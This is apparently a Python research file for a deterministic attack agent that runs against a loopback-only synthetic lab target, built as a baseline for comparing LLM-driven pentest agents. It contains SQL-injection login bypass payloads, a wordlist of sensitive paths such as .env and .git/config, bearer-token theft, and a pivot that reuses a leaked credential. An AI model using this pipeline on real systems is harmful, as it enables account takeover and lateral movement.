"""Fixed-pipeline attack agent: recon -> enumerate -> probe -> exploit -> report.

This is the DETERMINISTIC architecture (baseline) to compare against Cochise's
ReAct agent. The order of operations is hard-coded; the "brain" does not choose
what to do next. A pluggable decide() hook is left for the LLM-brain variant.

SAFETY (code-enforced):
  * ALLOWED_HOSTS gate: every request URL is parsed and refused unless the host
    is loopback. This agent physically cannot send traffic off-box.
  * Talks only to the one target base URL passed in.
  * No real exploit frameworks; only HTTP against our own synthetic target.

Run (target must be up):  python agent_lab/fixed_agent.py --base http://127.0.0.1:8700
"""
import argparse
import json
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone

ALLOWED_HOSTS = {'127.0.0.1', 'localhost', '::1'}

# Endpoint enumeration wordlist (web/ATO flavoured, not generic host pentest).
WORDLIST = ['/', '/login', '/api/profile', '/api', '/admin', '/api/admin',
            '/backup.sql', '/.git/config', '/.env', '/robots.txt', '/wp-login.php',
            '/dashboard', '/static']

# SQLi / auth-bypass probes for the login form (lab payloads).
SQLI_PROBES = ["' OR '1'='1", "admin'--", "' OR 1=1--", "student'--"]


def _check_host(url):
    host = urllib.parse.urlparse(url).hostname
    if host not in ALLOWED_HOSTS:
        raise PermissionError(f'blocked non-loopback target: {host!r} (allowed: {ALLOWED_HOSTS})')
    return host


class Agent:
    def __init__(self, base, session='', wordlist=None):
        self.base = base.rstrip('/')
        _check_host(self.base)
        self.session = session
        self.wordlist = list(wordlist) if wordlist is not None else list(WORDLIST)
        self.requests = 0
        self.report = dict(base=self.base, phases={}, session=session,
                           started=datetime.now(timezone.utc).isoformat())

    def _hdr(self, headers=None):
        h = dict(headers or {})
        if self.session:
            h['X-Session'] = self.session
        return h

    def _get(self, path, headers=None):
        url = self.base + path
        _check_host(url)
        req = urllib.request.Request(url, headers=self._hdr(headers), method='GET')
        self.requests += 1
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                return r.status, r.read().decode('utf-8', 'replace')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', 'replace')
        except Exception as e:  # noqa: BLE001 — lab tool, surface any transport error
            return None, str(e)

    def _post(self, path, form):
        url = self.base + path
        _check_host(url)
        data = urllib.parse.urlencode(form).encode()
        req = urllib.request.Request(url, data=data, method='POST',
                                     headers=self._hdr({'Content-Type': 'application/x-www-form-urlencoded'}))
        self.requests += 1
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                return r.status, r.read().decode('utf-8', 'replace')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', 'replace')
        except Exception as e:  # noqa: BLE001
            return None, str(e)

    # ---- phases ---------------------------------------------------------
    def recon(self):
        status, body = self._get('/')
        links = []
        if body:
            for tok in body.split('href='):
                if tok.startswith(("'", '"')):
                    links.append(tok[1:].split(tok[0], 1)[0])
        self.report['phases']['recon'] = dict(root_status=status, links=links,
                                              reachable=status is not None)
        return status is not None

    def enumerate(self):
        found = []
        for p in self.wordlist:
            status, _ = self._get(p)
            if status and status != 404:
                found.append(dict(path=p, status=status))
        self.report['phases']['enumerate'] = dict(found=found, tried=len(self.wordlist))
        return found

    def probe(self):
        """Try SQLi/auth-bypass on /login. Returns a working payload or None."""
        # benign baseline first (so the log shows a normal attempt too)
        self._post('/login', dict(username='student', password='wrongpw'))
        working = None
        for payload in SQLI_PROBES:
            status, body = self._post('/login', dict(username=payload, password='x'))
            try:
                ok = json.loads(body).get('authenticated') is True
            except Exception:  # noqa: BLE001
                ok = False
            if ok:
                working = payload
                break
        self.report['phases']['probe'] = dict(sqli_payload=working, vulnerable=bool(working))
        return working

    def exploit(self, payload):
        """Use the working payload to log in, then grab the crown jewel."""
        status, body = self._post('/login', dict(username=payload, password='x'))
        try:
            token = json.loads(body).get('token')
        except Exception:  # noqa: BLE001
            token = None
        jewel = None
        if token:
            s, b = self._get('/api/profile', headers={'Authorization': f'Bearer {token}'})
            if s == 200:
                jewel = b
        takeover = jewel is not None
        self.report['phases']['exploit'] = dict(token=token, crown_jewel=jewel,
                                               takeover=takeover)
        return takeover

    def run(self):
        t0 = time.monotonic()
        outcome = 'unreachable'
        if self.recon():
            self.enumerate()
            payload = self.probe()
            if payload:
                outcome = 'takeover' if self.exploit(payload) else 'exploit_failed'
            else:
                outcome = 'no_vuln_found'
        self.report['outcome'] = outcome
        self.report['total_requests'] = self.requests
        self.report['wall_seconds'] = round(time.monotonic() - t0, 2)
        self.report['finished'] = datetime.now(timezone.utc).isoformat()
        return self.report


# Stage vocabulary shared with react_agent (kept in sync; small enough to duplicate).
PIVOT_STAGES = {'start': 0, 'web_recon': 1, 'web_token': 2, 'pivot_cred': 3,
                'internal_token': 4, 'jewel_B': 5}


class PivotAgent:
    """Architecture A (deterministic) extended to the two-asset pivot. The order of
    operations is hard-coded; the 'brain' makes no choices. Emits the same metric
    shape as react_agent.ReactAgent so the runner can compare them uniformly."""

    def __init__(self, bases, session='fixed', wordlist=None):
        self.bases = bases
        for b in bases.values():
            _check_host(b)
        self.session = session
        self.wordlist = list(wordlist) if wordlist is not None else list(WORDLIST)
        self.requests = 0
        self.wasted = 0
        self.stage = 'start'
        self.trace = []

    def _bump(self, stage):
        if PIVOT_STAGES[stage] > PIVOT_STAGES[self.stage]:
            self.stage = stage

    def _req(self, method, host, path, form=None, token=None):
        url = self.bases[host] + path
        _check_host(url)
        headers = {'X-Session': self.session}
        if token:
            headers['Authorization'] = 'Bearer ' + token
        data = None
        if form is not None:
            data = urllib.parse.urlencode(form).encode()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        req = urllib.request.Request(url, data=data, method=method, headers=headers)
        self.requests += 1
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                return r.status, r.read().decode('utf-8', 'replace')
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8', 'replace')
        except Exception as e:  # noqa: BLE001
            return None, str(e)

    def run(self):
        t0 = time.monotonic()
        outcome = 'exhausted'
        # 1. recon + 2. enumerate (web)
        self._req('GET', 'web', '/')
        self._bump('web_recon')
        for p in self.wordlist:
            self._req('GET', 'web', p)
        # 3. SQLi login on web
        tok = None
        for payload in SQLI_PROBES:
            s, b = self._req('POST', 'web', '/login', form=dict(username=payload, password='x'))
            try:
                tok = json.loads(b).get('token')
            except Exception:  # noqa: BLE001
                tok = None
            if tok:
                break
        self.trace.append(dict(phase='web_sqli', token=bool(tok)))
        cred = None
        if tok:
            self._bump('web_token')
            # 4. read profile -> crown jewel A + pivot credential
            s, b = self._req('GET', 'web', '/api/profile', token=tok)
            if s == 200:
                try:
                    cred = json.loads(b).get('internal_service')
                except Exception:  # noqa: BLE001
                    cred = None
            self.trace.append(dict(phase='web_profile', pivot_cred=bool(cred)))
        if cred:
            self._bump('pivot_cred')
            # 5. pivot: login internal with leaked credential
            s, b = self._req('POST', 'internal', '/login',
                             form=dict(username=cred['user'], password=cred['password']))
            itok = None
            try:
                itok = json.loads(b).get('token')
            except Exception:  # noqa: BLE001
                itok = None
            if itok:
                self._bump('internal_token')
                # 6. read the vault (crown jewel B = final goal)
                s, b = self._req('GET', 'internal', '/api/vault', token=itok)
                if s == 200:
                    self._bump('jewel_B')
                    outcome = 'takeover'
            self.trace.append(dict(phase='internal_pivot', token=bool(itok)))
        return dict(architecture='fixed', knowledge='n/a', outcome=outcome,
                    takeover=self.stage == 'jewel_B', stage=self.stage,
                    stage_num=PIVOT_STAGES[self.stage], steps=len(self.trace),
                    requests=self.requests, wasted_actions=self.wasted,
                    wall_seconds=round(time.monotonic() - t0, 2), trace=self.trace)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--base', default='http://127.0.0.1:8700')
    ap.add_argument('--out', default='')
    args = ap.parse_args()
    report = Agent(args.base).run()
    text = json.dumps(report, ensure_ascii=False, indent=2)
    if args.out:
        from pathlib import Path
        Path(args.out).write_text(text, encoding='utf-8')
    print(text)


if __name__ == '__main__':
    main()
